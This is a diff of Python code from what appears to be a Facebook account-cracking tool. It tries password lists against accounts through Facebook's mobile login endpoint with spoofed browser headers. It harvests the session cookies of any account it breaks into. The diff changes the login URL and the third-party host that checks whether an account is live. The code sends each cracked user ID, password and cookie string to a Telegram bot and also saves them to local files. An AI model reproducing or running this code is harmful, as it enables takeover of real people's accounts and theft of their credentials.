@@ -777,7 +777,7 @@ def m1(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    ua = random.choice(usragent)
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get('https://lm.facebook.com').text
    log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
    header_freefb =  {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
@@ -791,29 +791,29 @@ def m1(idf,pwv):
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
     'Cache-Control': 'max-age=0',
-    'Referer': 'https://mbasic.beta.facebook.com/',
+    'Referer': 'https://lm.facebook.com/',
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-            open('/sdcard/ATOM-M4-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M4-live-OKc.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
-    if 'lock' in reqx:
+    if 'die' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M4-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -825,10 +825,8 @@ def m1(idf,pwv):
     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
     cp.append(uid)
    else:
-        continue
-  except requests.exceptions.ConnectionError:
-      waktu(31)
- loop+=1
+    continue
+  loop+=1
 
 def m2(idf,pwv):
  global loop,ok,cp
